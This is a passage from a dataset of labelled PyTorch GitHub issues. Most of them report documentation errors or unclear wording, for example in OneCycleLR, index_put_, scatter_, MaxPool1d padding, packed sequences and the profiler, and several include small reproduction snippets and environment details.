Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn the parameter description of `total_steps` in the class `OneClassLR` it says\r\n> The total number of steps in the cycle. Note that if a value is provided here, then it must be inferred by providing a value for epochs and steps_per_epoch. Default: None\r\n\r\nShouldn't that be \r\n> The total number of steps in the cycle. Note that if a value is **not** provided here, then it must be inferred by providing a value for epochs and steps_per_epoch. Default: None\r\n\r\nThe corresponding line in the source code. https://github.com/pytorch/pytorch/blob/4f62cbe7de8f867809ca601c996dd48a5a28ffca/torch/optim/lr_scheduler.py#L1046\n\ncc @vincentqb"},{"labels":["documentation",null],"text":"Categorical distribution is also called multinoulli distribution, instead of multinomial.\r\nAt the beginning of the page, under title \"score function\""},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nThe current documentation still copyrights PyTorch for 2019. This can be seen on the [documentation for master](https://pytorch.org/docs/master/) near the bottom.\r\n\r\nNote: I addressed this in PR #34291 along with some other documentation issues. This one stands out as it makes information appear to be outdated."},{"labels":["documentation",null],"text":"No docs online: https://pytorch.org/docs/master/search.html?q=conv_tbc&check_keywords=yes&area=default\r\n\r\nDocstring in code:\r\nhttps://github.com/pytorch/pytorch/blob/857eb4145e603db0941eb115e28e3aae654c49f8/torch/nn/functional.py#L212\r\n\r\nCode: https://github.com/pytorch/pytorch/blob/877c96cddfebee00385307f9e1b1f3b4ec72bfdc/aten/src/ATen/native/ConvolutionTBC.cpp\r\n\r\nIn general, is there a benchmark on `conv1d` vs `conv_tbc`?\r\n\r\nDoes `conv_tbc` get called under the hood of `conv1d` if TBC memory layout is detected?"},{"labels":["documentation",null],"text":"Note that on cpu both `inf` and `-inf` produce a negative number (int64_min)\r\n```python\r\nimport torch\r\n\r\nprint(torch.tensor(float('inf'), device = 'cpu', dtype = torch.float32).long())\r\n# tensor(-9223372036854775808)\r\nprint(torch.tensor(float('-inf'), device = 'cpu', dtype = torch.float32).long())\r\n# tensor(-9223372036854775808)\r\n\r\nprint(torch.tensor(float('inf'), device = 'cuda', dtype = torch.float32).long())\r\n# tensor(9223372036854775807, device='cuda:0')\r\nprint(torch.tensor(float('-inf'), device = 'cuda', dtype = torch.float32).long())\r\n# tensor(-9223372036854775808, device='cuda:0')\r\n\r\nprint(torch.tensor(float('inf'), device = 'cuda', dtype = torch.float16).long())\r\n# tensor(9223372036854775807, device='cuda:0')\r\nprint(torch.tensor(float('-inf'), device = 'cuda', dtype = torch.float16).long())\r\n# tensor(-9223372036854775808, device='cuda:0')\r\n```\r\n\r\nThe mere possibility of converting inf/-inf to long is already doubtful (and probably worth a mention in the docs somewhere)"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/master/torch.html?highlight=torch%20full#torch.full\r\n\r\n`fill_value ‚Äì the number to fill the output tensor with.`\r\n\r\nthe arg spec or the arg description doesn't specify if the \"number\" must be Python scalar or if Torch scalar is also fine. It also doesn't specify if the device of the Torch scalar must match the device passed to the `full(...)` call and if gradient to `fill_value` is backpropped, Wording `number` is quite vague.\r\n\r\nAlso argument name `size` is used - maybe better to replace it with `shape`? `shape` property name was adopted long time ago, and even NumPy uses `shape` in the similar method: https://docs.scipy.org/doc/numpy/reference/generated/numpy.full.html"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nWhen browsing through the docs on normalization layers, I realized that `torch.nn.functional.group_norm` is missing from the documentation (the `torch.nn.GroupNorm` layer counterpart is there). I am wondering why it is missing. My guess would be that this is not the intended behaviour.\r\n"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/master/torch.html?highlight=meshgrid#torch.meshgrid\r\n\r\narg spec has some \"**kwargs\", but it's not described in the doc string and there is no code example \r\n\r\nI think it should be removed"},{"labels":[null,"documentation",null,null],"text":"https://pytorch.org/cppdocs/api/function_namespacetorch_1a99dc9f736064b2179cc58e6436f7a021.html#exhale-function-namespacetorch-1a99dc9f736064b2179cc58e6436f7a021\r\n\r\nhttps://pytorch.org/cppdocs/api/function_namespacetorch_1a4b369494adfb10b9a005aeb0bb6207cb.html#exhale-function-namespacetorch-1a4b369494adfb10b9a005aeb0bb6207cb\r\n\r\nsee issue: https://github.com/pytorch/pytorch/issues/33862#issuecomment-593518890\n\ncc @yf225 @vincentqb"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/tensors.html#torch.Tensor.index_put_\r\n\r\n`\r\nPuts values from the tensor value into the tensor self using the indices specified in indices (which is a tuple of Tensors). The expression tensor.index_put_(indices, value) is equivalent to tensor[indices] = value\r\n`\r\n\r\nHowever if we follow the suggested link [indices](https://pytorch.org/docs/master/tensors.html#torch.Tensor.indices), it only explains something about sparse tensors: `If self is a sparse COO tensor (i.e., with torch.sparse_coo layout), this returns a view of the contained indices tensor. Otherwise, this throws an error.`\r\n\r\nSo this (the suggested indices link + phrasing \"using the indices specified in indices\" and the requirement to use a tuple of tensors) is a confusing reference when `index_put_` is to be used with dense tensors.\r\n\r\nIf the function is not normally expected to be used with dense tensors, a notice about that would be a great clarification.\r\n```python\r\na = torch.rand(3)\r\na.index_put_((torch.tensor(-1), ), torch.tensor(0.0)) # notice a lot of wrapper torch.tensor calls and the required tuple\r\n```\r\n\r\nIn the doc it mentions that the op is equivalent to `tensor[indices] = value`, so naturally I first tried the call `a.index_put_(-1, 0)` for zeroing out the last tensor element and it failed badly."},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/tensors.html#torch.Tensor.scatter_\r\n\r\n1. The function signature `scatter_(dim, index, src) ‚Üí Tensor` has no mention of `value`, so it is confussing to find it in argument spec. I think it'd be clearer if the argument spec just mentioned that `src` can be a scalar:\r\n```\r\nsrc (Tensor) ‚Äì the source element(s) to scatter, incase value is not specified\r\nvalue (float) ‚Äì the source element(s) to scatter, incase src is not specified\r\n```\r\nThe function description also has no mention of `value`.\r\n 2. Typo: 'incase\" in one word"},{"labels":[null,null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe documentation webpage is ridiculously heavy (~300MB on Chrome) and will crash any phone's browser. Can we section it into smaller chunks?\r\n\r\n<img width=\"514\" alt=\"Screenshot 2020-02-29 22 02 32\" src=\"https://user-images.githubusercontent.com/2119355/75618659-82939a00-5b3f-11ea-8d57-a01994277f22.png\">\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null],"text":"## üêõ Can't save to ostream\r\n\r\nI want to save my model as a `istream` for later processing.\r\nI found the following on the api:\r\n\r\nhttps://pytorch.org/cppdocs/api/function_namespacetorch_1a99dc9f736064b2179cc58e6436f7a021.html#exhale-function-namespacetorch-1a99dc9f736064b2179cc58e6436f7a021\r\n\r\nhttps://pytorch.org/cppdocs/api/function_namespacetorch_1a4b369494adfb10b9a005aeb0bb6207cb.html#exhale-function-namespacetorch-1a4b369494adfb10b9a005aeb0bb6207cb\r\n\r\n## To Reproduce\r\n`torch::optim::SGD sgd(0.9);` give me error: \r\n\r\n>Error (active)\tE0289\tno instance of constructor \"torch::optim::SGD::SGD\" matches the argument list\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): LibTorch 1.4\r\n - OS (e.g., Linux): Windows 7 64 bit\r\n - How you installed PyTorch (`conda`, `pip`, source): source: https://download.pytorch.org/libtorch/cpu/libtorch-win-shared-with-deps-1.4.0.zip\r\n - Build command you used (if compiling from source): cmake --build . --config Release --target INSTALL\r\n - Python version: 3.6\r\n - CUDA/cuDNN version: NA\r\n - GPU models and configuration: NA\r\n - Any other relevant information: NA\r\n\r\n\n\ncc @yf225"},{"labels":[null,"documentation",null],"text":"## üìö Documentation on PyTorch Profiler\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nI don't fully understand the output of [PyTorch Profiler](https://pytorch.org/docs/stable/autograd.html#torch.autograd.profiler.profile) after using `torch.autograd.profiler` (combined with `torch.autograd.profiler.record_function` for labeling). To be specifically, the output of `prof.key_averages().table(sort_by=\"cuda_time_total\")` gets the following table:\r\n\r\n| Name | Self CPU total % | Self CPU total | CPU total % | CPU total | CPU time avg | CUDA total % | CUDA total | CUDA time avg | Number of Calls |\r\n| ---- | ---------------- | -------------- | ----------- | --------- | ------------ | ------------ | ---------- | ------------- | --------------- |\r\n|      |                  |                |             |           |              |              |            |               |                 |\r\n\r\nIt seems the document doesn't explain much for the clear meanings of each item. To be concretely, I will very appreciate if the document can provide answers to the following questions:\r\n\r\n1. What's the meaning and the difference of `Self CPU total` and `CPU total`\r\n2. Is the `CUDA total` purely the execution time for the cuda code? Or it also includes time of kernel launching, kernel queueing in GPU? \r\n3. How can I understand the `CPU total` for operations which are executed on GPU, e.g., model forwarding and backwarding. Since these operations are done in GPU, but I still find even unneglectable time cost spent by CPU.\r\n\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":[null,null,"documentation",null],"text":"This page is 404:\r\nhttp://docs.pytorch.org/\r\n\r\nThis can be confusing, and we should issue a redirect to pytorch.org/docs\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThe docs of `MultiplicativeLR` use `LambdaLR` as example, instead, `MultiplicativeLR` itself should be used.\r\n\r\nThe issue exists in docs of `MultiplicativeLR`:\r\n\r\nhttps://github.com/pytorch/pytorch/blob/4460c8b034f8fd544ff9c271c4aa21698644d352/torch/optim/lr_scheduler.py#L238-L257\r\n\r\nin line 252, it should use `MultiplicativeLR` as example: \r\n\r\nhttps://github.com/pytorch/pytorch/blob/4460c8b034f8fd544ff9c271c4aa21698644d352/torch/optim/lr_scheduler.py#L252\r\n\r\nIt seems that this example was copied from `LambdaLR` but hasn't been correctly edited.\r\n\r\n"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\ntorch/nn/utils/rnn.html:\r\n\r\n`pad_packed_sequence` doc has a confusing stand-alone statement in the description of the function:\r\n\r\n> Batch elements will be ordered decreasingly by their length.\r\n\r\nOrdered when and where? \r\n\r\nOn the contrary the padded output is \"unsorted\" to how it was originally sorted when `pack_padded_sequence` or `pack_sequence` were called. So the statement in question is only correct if the original sequence was ordered decreasingly by the length of its elements and isn't necessarily the case with `enforce_sorted=False`.\r\n\r\nPerhaps it should say instead:\r\n\r\n> Batch elements will be re-ordered as they were ordered originally when the batch was passed to `pack_padded_sequence` or `pack_sequence`.\r\n\r\nBut then it's possible that  `sequence.unsorted_indices` is `None`, in which case no sorting will happen.\r\n\r\nAnd perhaps the sorting note would be better serving in the `Returns` part of the description?\r\n\r\nExample:\r\n\r\n```\r\nseq = torch.tensor([[1,2,3,0], [4,5,0,0], [6,3,5,1]])\r\nlens = [3, 2, 4]\r\npacked = pack_padded_sequence(seq, lens, batch_first=True, enforce_sorted=False)\r\npacked\r\nseq_unpacked, lens_unpacked = pad_packed_sequence(packed, batch_first=True)\r\nseq_unpacked\r\nlens_unpacked\r\n```\r\n```\r\nPackedSequence(data=tensor([6, 1, 4, 3, 2, 5, 5, 3, 1]), batch_sizes=tensor([3, 3, 2, 1]), sorted_indices=tensor([2, 0, 1]), unsorted_indices=tensor([1, 2, 0]))\r\ntensor([[1, 2, 3, 0],\r\n        [4, 5, 0, 0],\r\n        [6, 3, 5, 1]])\r\ntensor([3, 2, 4])\r\n```\r\ni.e. everything is nicely restored to the original order (which is not ordered by lengths).\r\n\r\nThank you."},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe docs for [index_put_](https://pytorch.org/docs/master/tensors.html#torch.Tensor.index_put_) state in the second paragraph:\r\n```\r\nIf accumulate is True, the elements in tensor are added to self. If accumulate is False, the behavior is undefined if indices contain duplicate elements.\r\n```\r\n\r\nIt should be corrected to `elements in _value_ are added to self`."},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\ntorch/nn/utils/rnn.html:\r\n\r\n`pack_padded_sequence` has a confusing and incomplete description of the `enforce_sorted` param. Currently it goes:\r\n\r\n```\r\n        enforce_sorted (bool, optional): if ``True``, the input is expected to\r\n            contain sequences sorted by length in a decreasing order. If\r\n            ``False``, this condition is not checked. Default: ``True``.\r\n```\r\n\r\nThe second part \"this condition is not checked\" (1) makes no sense since the alluded to condition is not described and (2) it's incomplete as it doesn't reflect the important part, that it actually does the sorting. I think it should say something like:\r\n\r\n```\r\n        enforce_sorted (bool, optional): if ``True``, the input is expected to\r\n            contain sequences sorted by length in a decreasing order. If\r\n            ``False``, the input will get sorted unconditionally. Default: ``True``.\r\n```\r\n\r\nI'm not sure whether it should also mention `sorted_indices` to enable recovering of the original sorting order, if one doesn't use `pad_packed_sequence` to unpack it.\r\n\r\nThanks.\n\ncc @zou3519"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\nAccording to the documentation on [`nn.MaxPool1d`](https://pytorch.org/docs/stable/nn.html#torch.nn.MaxPool1d):\r\n\r\n> If `padding` is non-zero, then **the input is implicitly zero-padded on both sides** for `padding` number of points. `dilation` controls the spacing between the kernel points. It is harder to describe, but this link has a nice visualization of what `dilation` does.\r\n\r\nHowever, the input is never padded with zeros, either explicitly or implicitly. Doing a bit of source diving I found that the maximum operation [initializes with negative infinity](https://github.com/pytorch/pytorch/blob/d35a4c202e917b5d5cb67ac749fcf7931212c25b/aten/src/ATen/native/DilatedMaxPool2d.cpp#L59), not zero, and only considers entries from the original, unpadded input tensor. Therefore it would be correct to say that the max-pooling operation uses implicit negative infinity padding but not zero-padding.\r\n\r\nThis appears to be either a bug in the API or documentation (of course PEBCAK is always a possibility).\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Install PyTorch\r\n2. Run the following code\r\n```\r\n>>> import torch\r\n>>> from torch.nn.functional import max_pool1d\r\n>>> x = torch.tensor([[[-1., -2.]]])\r\n>>> max_pool1d(x, kernel_size=2, padding=1)\r\ntensor([[[-1., -2.]]])\r\n>>> max_pool1d(x.cuda(), kernel_size=2, padding=1)\r\ntensor([[[-1., -2.]]], device='cuda:0')\r\n```\r\n\r\n## Expected behavior\r\n\r\nIf zero-padding was being used we would expect the output to be `tensor([[[0., 0.]]])` since zero is larger than all the input tensor elements.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.4.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Red Hat Enterprise Linux Workstation release 7.7 (Maipo)\r\nGCC version: (GCC) 6.3.0\r\nCMake version: version 3.11.4\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: \r\nGPU 0: GeForce RTX 2080 Ti\r\nGPU 1: GeForce RTX 2080 Ti\r\n\r\nNvidia driver version: 430.40\r\ncuDNN version: 7.6.3\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.1\r\n[pip3] torch==1.4.0\r\n[pip3] torchvision==0.5.0\r\n[conda] Could not collect\r\n\r\n## Additional context\r\n\r\nThis issue is based on a [question originally asked on StackOverflow](https://stackoverflow.com/questions/60240434) by user trsvchn."},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nhttps://pytorch.org/docs/stable/nn.html#lstm\r\n\r\n> output of shape (seq_len, batch, num_directions * hidden_size): tensor containing the output features (h_t) from the last layer of the LSTM, for each t. If a torch.nn.utils.rnn.PackedSequence has been given as the input, the output will also be a packed sequence.\r\n\r\nThe shape should actually be `(batch, seq_len, num_directions * hidden_size)`"},{"labels":["documentation"],"text":"## üìö Documentation\r\n\r\nFor example [torch.add](https://pytorch.org/docs/master/tensors.html#torch.Tensor.add) says\r\n\r\n```\r\nadd(value) ‚Üí Tensor\r\n    add(other, *, value=1) -> Tensor\r\n\r\n    See torch.add()\r\n```\r\n\r\nBut indeed the value flag doesn't exist.\r\n\r\n```\r\n>>> import torch\r\n>>> a = torch.randn(1, 3)\r\n>>> b = torch.randn(1, 3)\r\n>>> a\r\ntensor([[-0.5835, -0.1405, -1.8119]])\r\n>>> b\r\ntensor([[ 0.8623, -1.3727,  1.5434]])\r\n>>> a.add(b)\r\ntensor([[ 0.2789, -1.5132, -0.2685]])\r\n>>> a.add(b, 1)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() takes 1 positional argument but 2 were given\r\n>>> a.add(b, 2)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() takes 1 positional argument but 2 were given\r\n>>> a.add(b, valu=2)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() got an unexpected keyword argument 'valu'\r\n>>> a.add(b, value=2)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() got an unexpected keyword argument 'value'\r\n>>> a.add(b, 2)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: add() takes 1 positional argument but 2 were given\r\n```\r\n\r\nInstead one has to use ```alpha``` as a flag.\r\n\r\n```\r\n>>> import torch\r\n>>> a = torch.randn(1, 3)\r\n>>> b = torch.randn(1, 3)\r\n>>> a.add(a, alpha=3.0)\r\ntensor([[ 3.3190, -0.4248, -3.6609]])\r\n```\r\n\r\nThere are many other instances of this in the documentation."},{"labels":["documentation",null],"text":"These aren't documented anywhere and it's unclear how they're different from `torch::save`"},{"labels":["documentation",null],"text":"```\r\ntorch.optim\r\nQuantization\r\nDistributed RPC Framework\r\ntorch.random\r\n```\r\nwhy this order? not even alphabetical. I'd suggest that big special topics such as Quantization are presented on top in a separate section, and the rest to be in alphabetical order.\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/73972687-8c035b00-4921-11ea-82a9-01c4d09cc5b3.png)"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\ndocumentation includes use of random_pruning, but there is nothing like random_pruning.\r\n```\r\nm = random_pruning(nn.Linear(5, 7), name='weight', amount=0.2)\r\nprune.random_pruning(m, name='weight', amount=0.2)\r\n```\r\nAttributeError: module 'torch.nn.utils.prune' has no attribute 'random_pruning'\r\n\r\nsame thing for remove_pruning also,\r\n```\r\n>>> m = remove_pruning(m, name='weight')\r\n```\r\nAttributeError: module 'torch.nn.utils.prune' has no attribute 'remove_pruning'"},{"labels":["documentation",null,null],"text":"https://pytorch.org/docs/master/search.html?q=__version__&check_keywords=yes&area=default#\r\n\r\nhttps://pytorch.org/docs/master/search.html?q=version&check_keywords=yes&area=default#\r\n\r\nBoth are also missing from the doc navigation left pane (`torch.__config__` is there)\r\n"},{"labels":[null,null,"documentation",null],"text":"## üìö Documentation\r\n\r\n### There's no way to access api from search engine in one click.\r\n\r\nI find it's very hard to search pytorch api from search engine. A typical example would be seaching `pytorch conv2d`, the top result points to `https://pytorch.org/docs/stable/nn.html` without the heading hash `#conv2d`. \r\n\r\n<img width=\"668\" alt=\"Screen Shot 2020-01-27 at 12 28 28 PM\" src=\"https://user-images.githubusercontent.com/1488391/73486826-e0339b80-4373-11ea-8c04-93551011b107.png\">\r\n\r\nIn most cases, it's sth like the following img, where there's a `jump to xxx` link to the hashed url `https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#Body`\r\n\r\n<img width=\"794\" alt=\"Screen Shot 2020-01-30 at 2 40 14 PM\" src=\"https://user-images.githubusercontent.com/1488391/73484929-30a8fa00-4370-11ea-9ded-0355951e9e15.png\">\r\n\r\nI'm not sure what's missing here, a quick search seems to suggest search engine need an unique id in headings like `<h4 id=\"xxx\"></h4>` to tell the heading structure.\r\n\r\nThe search bar in the doc page definitely works, It's also nice to have one click search engine access.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null],"text":"## üìö Documentation\r\nJust a very small grammatical issue. \r\n![grammar_error_transformsontorch](https://user-images.githubusercontent.com/11468122/73418974-183ece00-42e3-11ea-992b-bdce07172f07.PNG)\r\nSuggested fix: \"mutates\" to \"mutate\"\r\n\r\n\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nThe documentation of torch functions (e.g. `torch.sort`, `torch.max`) and the class `torch.Tensor` is not loaded by common IDEs as PyCharm and Visual Studio Code.\r\nThe documentation of other modules (e.g. `torch.nn`, `torch.optim`) is loaded correctly.\r\n\r\nThe problem seems to be related to dynamic documentation which is not supported by IDEs (static docs are not inserted in `torch.__init__.pyi`). The (dynamic) documentation is loaded correctly in python consoles only.\r\nPlease see the related PyCharm issue.\r\n\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Create a new Python project with PyCharm or Visual Studio Code\r\n1. Import torch\r\n1. Start typing a torch function or a tensor method (e.g. `torch.sort`, `torch.ones', 'torch.ones().max`). An empty documentation popup will be opened.\r\nThe same behavior occurs with keyboard shortcuts (PyCharm: `Ctrl+Q`, Visual Studio Code: `Ctrl+K, Ctrl+I`)\r\n\r\n## Expected behavior\r\n\r\nStatic documentation should be available for every torch module to support documentation loading by IDEs.\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): 1.2.0, 1.3.1, 1.4.0\r\n - OS (e.g., Linux): Windows and Linux\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.6\r\n - CUDA/cuDNN version: 10\r\n - GPU models and configuration: 1080Ti\r\n - Any other relevant information: PyCharm 2019.3.2, Visual Studio Code 1.41.1\r\n\r\n## Additional context\r\n\r\nRelated PyCharm issue: [https://youtrack.jetbrains.com/issue/PY-40262](https://youtrack.jetbrains.com/issue/PY-40262)"},{"labels":[null,null,"documentation",null],"text":"## üêõ Bug\r\n\r\nBuilding the docs on master on my machine gives a long list of scary error messages. The docs build that we run in the CI doesn't seem to have this problem, implying that it might be a dependency issue. However, the `katex` package we use has no versioning(!) and doesn't appear to do normal releases. In the interest of making the docs build portable, we should fix the errors.\r\n\r\n```\r\n/usr/lib/nodejs/katex/dist/katex.js:1364\r\n                throw new _ParseError2.default(\"Expected '\" + text + \"', got '\" + this.nextToken.text + \"'\", this.nextToken);\r\n                ^\r\n\r\nParseError: KaTeX parse error: Expected 'EOF', got '\\\\' at position 33: ‚Ä¶_{t} + g_{t+1} \\Ã≤\\Ã≤\r\np_{t+1} = p_{t‚Ä¶\r\n    at new ParseError (/usr/lib/nodejs/katex/dist/katex.js:1181:16)\r\n    at Parser.expect (/usr/lib/nodejs/katex/dist/katex.js:1364:23)\r\n    at Parser.parseInput (/usr/lib/nodejs/katex/dist/katex.js:1415:18)\r\n    at Parser.parse (/usr/lib/nodejs/katex/dist/katex.js:1401:30)\r\n    at parseTree (/usr/lib/nodejs/katex/dist/katex.js:9501:17)\r\n    at Object.renderToString (/usr/lib/nodejs/katex/dist/katex.js:68:40)\r\n    at Socket.<anonymous> (/usr/lib/nodejs/katex/cli.js:30:26)\r\n    at emitNone (events.js:111:20)\r\n    at Socket.emit (events.js:208:7)\r\n    at endReadableNT (_stream_readable.js:1064:12)\r\n/usr/lib/nodejs/katex/dist/katex.js:1364\r\n                throw new _ParseError2.default(\"Expected '\" + text + \"', got '\" + this.nextToken.text + \"'\", this.nextToken);\r\n                ^\r\n\r\nParseError: KaTeX parse error: Expected 'EOF', got '\\\\' at position 38: ‚Ä¶+ lr * g_{t+1} \\Ã≤\\Ã≤\r\np_{t+1} = p_{t‚Ä¶\r\n    at new ParseError (/usr/lib/nodejs/katex/dist/katex.js:1181:16)\r\n    at Parser.expect (/usr/lib/nodejs/katex/dist/katex.js:1364:23)\r\n    at Parser.parseInput (/usr/lib/nodejs/katex/dist/katex.js:1415:18)\r\n    at Parser.parse (/usr/lib/nodejs/katex/dist/katex.js:1401:30)\r\n    at parseTree (/usr/lib/nodejs/katex/dist/katex.js:9501:17)\r\n    at Object.renderToString (/usr/lib/nodejs/katex/dist/katex.js:68:40)\r\n    at Socket.<anonymous> (/usr/lib/nodejs/katex/cli.js:30:26)\r\n    at emitNone (events.js:111:20)\r\n    at Socket.emit (events.js:208:7)\r\n    at endReadableNT (_stream_readable.js:1064:12)\r\n/usr/lib/nodejs/katex/dist/katex.js:1364\r\n                throw new _ParseError2.default(\"Expected '\" + text + \"', got '\" + this.nextToken.text + \"'\", this.nextToken);\r\n                ^\r\n\r\nParseError: KaTeX parse error: Expected 'EOF', got '\\\\' at position 147: ‚Ä¶ (2k+1)T_{max};\\Ã≤\\Ã≤\r\n\\eta_{t+1} = \\‚Ä¶\r\n    at new ParseError (/usr/lib/nodejs/katex/dist/katex.js:1181:16)\r\n    at Parser.expect (/usr/lib/nodejs/katex/dist/katex.js:1364:23)\r\n    at Parser.parseInput (/usr/lib/nodejs/katex/dist/katex.js:1415:18)\r\n    at Parser.parse (/usr/lib/nodejs/katex/dist/katex.js:1401:30)\r\n    at parseTree (/usr/lib/nodejs/katex/dist/katex.js:9501:17)\r\n    at Object.renderToString (/usr/lib/nodejs/katex/dist/katex.js:68:40)\r\n    at Socket.<anonymous> (/usr/lib/nodejs/katex/cli.js:30:26)\r\n    at emitNone (events.js:111:20)\r\n    at Socket.emit (events.js:208:7)\r\n    at endReadableNT (_stream_readable.js:1064:12)\r\n```\r\n\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null],"text":"## üêõ Bug\r\n\r\nThe following code results in `0` when the expected answer is `-1`:\r\n\r\n```python\r\ndef f1(x):\r\n    def f2(y):\r\n        return y*(x-y)\r\n    return torch.autograd.grad(f2(x), x, create_graph=True)[0]\r\n\r\nx = torch.tensor(1.0, requires_grad=True)\r\ntorch.autograd.grad(f1(x), x)[0]\r\n```\r\n\r\n## To Reproduce\r\n\r\nRun the code above.\r\n\r\n## Expected behavior\r\n\r\nThe code should result in `tensor(-1.)` rather than `tensor(0.)`.\r\n\r\n## Environment\r\n\r\n```\r\nPyTorch version: 1.4.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Mac OSX 10.15.1\r\nGCC version: Could not collect\r\nCMake version: version 3.15.5\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.16.3\r\n[pip3] torch==1.4.0\r\n[pip3] torchvision==0.5.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.3                      199  \r\n[conda] mkl_fft                   1.0.12           py37h5e564d8_0  \r\n[conda] mkl_random                1.0.2            py37h27c97d8_0  \r\n[conda] pytorch                   1.4.0                   py3.7_0    pytorch\r\n[conda] torchvision               0.5.0                  py37_cpu    pytorch\r\n```\r\n\r\n## Additional context\r\n\r\nThe following code in JAX produces the expected behaviour, for comparison:\r\n\r\n```python\r\ndef f1(x):\r\n    def f2(y):\r\n        return y*(x-y)\r\n    return jax.jvp(f2, (x,), (1.0,))[1]\r\n\r\njax.jvp(f1, (1.0,), (1.0,))[1] # => DeviceArray(-1., dtype=float32)\r\n```\r\n\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nTyping interface file([`nn/parameter.pyi`](https://github.com/pytorch/pytorch/blob/master/torch/nn/parameter.pyi) file) does not match with source code ([`nn/parameter.py`](https://github.com/pytorch/pytorch/blob/master/torch/nn/parameter.py) file).\r\n\r\n## Expected behavior\r\n\r\n`nn/parameter.pyi` should be\r\n\r\n```python\r\nfrom .. import Tensor\r\nimport builtins\r\n\r\nclass Parameter(Tensor):\r\n    def __init__(self, data: Tensor = ..., requires_grad: builtins.bool = ...): ...\r\n    ...\r\n```\r\n\r\nbecause arguments in `nn.Parameter`'s constructor has default values. (`def __new__(cls, data=None, 